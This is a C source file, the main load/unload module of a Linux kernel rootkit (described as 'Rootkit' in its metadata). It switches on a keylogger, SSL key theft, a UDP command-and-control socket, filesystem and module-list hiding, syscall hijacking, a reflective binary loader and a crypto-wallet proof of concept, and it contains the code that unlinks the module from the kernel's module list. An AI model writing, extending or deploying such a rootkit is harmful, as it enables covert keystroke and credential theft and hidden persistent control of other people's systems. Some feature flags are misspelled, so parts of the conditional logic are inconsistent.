/*
    * This file contains a load and unload functions 
*/

#pragma once;
#pragma message ("Compiling: "__FILE__)

#define verbose 0

#define keylogger 1 /*Requiere sendNetworkPackets*/ /*Requiere socket*/
#define binatyLoader 1
#define SSLKeys 1 /**/ /*Requiere charRoot*/ /*Requiere socket*/
#define charRoot 1
#define sendNetworkPackets 0
#define networkCC 1
#define hideDentry 1 /*Te oculta en el sistema de ficheros*/
#define hideModuleList 0 /*Te oculta de la lista de modulos del kernel (pero no se puede descargar)*/
#define pocInifinityWallet 1

// ! Format pr_info
#define pr_fmt(fmt) " %s: %s(): " fmt, KBUILD_MODNAME, __func__

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include "taskManipulator.c"
#include "socket.c"
#include "keylogger.c"
#include "netfilter.c"
#include "charDevice.c"
#include "syscallHijacking.c"
#include "binaryLoader.c"

static int firstLoad=1;
module_param(firstLoad, int, 0660);

// * Prototypes
static void hideModule(void);
static void showModule(void);

static struct list_head *prev_module;

/* Module parameters */
MODULE_AUTHOR("Interrupt_Request");
MODULE_DESCRIPTION("Rootkit");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("1.0");

/* Init function*/
static int __init lkm_init(void){
	#if verbose == 1
		printk(KERN_EMERG "Hello, world\n");
		pr_info("Hello, world from pr_info\n");
	#endif 

	#if networkCC == 1
		// ! Remember disconnect before unload kernel module (Crashed kernel if you dont)!!!
		create_socket_UDP();
	#endif

	#if sendNetworkPackets == 1 && networkCC == 1
		// ! Remember disconnect before unload kernel module (Crashed kernel if you dont)!!!
		registerPacketCapturerHook();
	#endif
	

	#if keylogger == 1 && networkCC == 1 
		// ! Remember disconnect before unload kernel module (Crashed kernel if you dont)!!!
		connect_keyboard_notifier();
	#endif
	

	#if SSLKeys == 1 && charRoot == 1 && networkCC == 1
		patchEnviromentVariables();
	#endif

	#if hideDentry == 1
		register_probe_dentry();
	#endif

	#if charRoot == 1
		createDevice();
	#endif

	#if binatyLoader == 1
		#if usermode_driver == 0
			runReflectiveLoader_FILE(firstLoad);
		#else
			runReflectiveLoader_REFLECTIVE();
		#endif
	#endif

	#if pocInifinityWallet == 1 && networkCC == 1
		if(firstLoad == 0){pocInfinityWalletTimer();}		
	#endif

	#if hideModuleList == 1
		hideModule();
	#endif

	return 0;		/* success */
}

// ! If the function (__exit lkm_exit(void)) is removed, it cannot be unloaded with the kernel set to CONFIG_MODULE_FORCE_UNLOAD = disabled.
/* Remove function */
static void __exit lkm_exit(void){
	#if verbose == 1
		printk(KERN_INFO "Goodbye\n");
	#endif

	#if sendNetworkPackets == 1 && networkCC == 1
		unregisterPacketCapturerHook();	
	#endif

	#if networkCC == 1
		free_socket();
	#endif

	#if keylogger == 1 && networkCC == 1
		disconnect_keyboard_notifier();
	#endif

	#if charRoot == 1
		destroyDevice();
	#endif

	#if binaryLoader == 1
		#if usermode_driver == 0
			unloadReflectiveLoader_REFLECTIVE();
		#endif
	#endif

	#if hideDentry == 1
		unregister_probe_dentry();
	#endif
	#if pocInifinityWallet == 1 && networkCC == 1
		if(firstLoad == 0){pocInfinityWalletTimerRelease();}
	#endif
}	

module_init(lkm_init);
module_exit(lkm_exit);


static void hideModule(void){
	prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}
static void showModule(void){
	list_add(&THIS_MODULE->list, prev_module);
}